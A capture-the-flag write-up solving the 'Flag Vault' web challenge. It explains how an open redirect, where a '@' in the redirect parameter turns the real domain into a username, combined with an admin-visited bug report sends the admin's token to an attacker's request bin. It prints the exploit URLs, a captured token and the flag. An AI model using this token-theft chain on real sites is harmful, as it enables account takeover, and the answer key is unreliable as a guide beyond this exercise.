# Flag Vault


## Steps of Analysis

### 1. Inspecting
We're taken into a small site:
(image here - main page)
Its body looks like that:
```html
<body>
    <main>
        <h1>Flag Vault</h1>
        <form>
            <input type="email" required name="email" placeholder="Email" />
            <input type="password" required name="password" placeholder="Password" />
            <button>Show Flag</button>
        </form>
        <a href="javascript:report()">Report a bug</a>
    </main>
    <script>
        const params = new URLSearchParams(window.location.search);
        const query = Object.fromEntries(params.entries());
        const redirectTo = String(query.redirect || "");

        const form = document.querySelector("form");
        const email = document.querySelector("input[name=email]");
        const password = document.querySelector("input[name=password]");

        form.addEventListener("submit", async function (event) {
            event.preventDefault();

            const jsonBody = JSON.stringify({ email: email.value, password: password.value });

            const response = await fetch("/api/v1/login", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: jsonBody
            });

            if (response.status === 401) {
                return alert("Invalid email or password");
            }

            const jsonData = await response.json();
            window.location = location.origin + redirectTo + "?token=" + jsonData.token;
        });

        function report() {
            const url = prompt("URL", window.location.href);
            fetch("/api/v1/report?url=" + encodeURIComponent(url));
        }
    </script>
</body>
```
POST request sent with the email and password and a secret token probably sent back when the email and the password is correct.
Two interesting points there are:
* The "report a bug" button
* The redirect mechanism

Needless to say that we don't know the "correct" email and password:
(image here - main page error)

### 2. Report a Bug
We can "report" a bug by sending a URL

(image here - main page report bug)

We assume that  "someone" (probably the admin) will enter that link later to watch the given link.

We'd  like to make the admin in the other side to enter a link that controlled by us (like in a request bin) to get his cookies (the token in our case)

The problem with the above idea is that the server returns an error when it gets external URL.

So we can't send in the "report bug" request a direct link to the request bin because sending:
http://flag-vault.chal.intentsummit.org/api/v1/report?url=http://enqr0riu3ob4o6p.m.pipedream.net
will result in:
```
{"error":"INVALID_URL_HOST"}
```

Therefore the link that we give here should be in the same domain.

All in all looks ok, and no bugs being seen so far... :(

But fortunately, there is another place in the code that can send (redirect) us to other place.

### 3. Redirect
The bug is in the redirect mechanism

The redirection mechanism here takes the content of a parameter named "redirect":
```js
const redirectTo = String(query.redirect || "");
```
And later **concatenates** the current address to it
```js
window.location = location.origin + redirectTo + "?token=" + jsonData.token;
```
Can we make this expression to go outside the domain?

YES :)

We can use the current address to be parsed as a **username** instead of an address by concatenating to it an "@" symbol.

In that way, sending @enqr0riu3ob4o6p.m.pipedream.net as "redirect" parameter will result in changing the window location to:
http://flag-vault.chal.intentsummit.org@enqr0riu3ob4o6p.m.pipedream.net
The previously-domain-name is now used as a username :)

### 4. Conclusion
So far, we want to report an address in the domain.

And we want the admin to enter it and to be redirected to the our request-bin, hopefully with its token.

We can achieve it by reporting on this URL:
http://flag-vault.chal.intentsummit.org/?redirect=@enqr0riu3ob4o6p.m.pipedream.net

The address here is in the "right domain", and upon redirection the "right domain" will be treated as a username.

Cool

## solution
According to the above, we'll send this request first:
http://flag-vault.chal.intentsummit.org/api/v1/report?url=http://flag-vault.chal.intentsummit.org/?redirect=@enqr0riu3ob4o6p.m.pipedream.net
In response we get the token to the request bin!
(image here - request bin token)

The expiration date of the token is 10 seconds, so in that time we should quickly send:
http://flag-vault.chal.intentsummit.org/admin/?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwiaWF0IjoxNjM2OTI1NTU0LCJleHAiOjE2MzY5MjU1NjR9.kkBa7w3fkp2kO06TcV-V1lYQFCrfNVBIbG5TFd8RS1I
response:
```
{"flag":"INTENT{danger0us_0pen_red1rect}"}
```
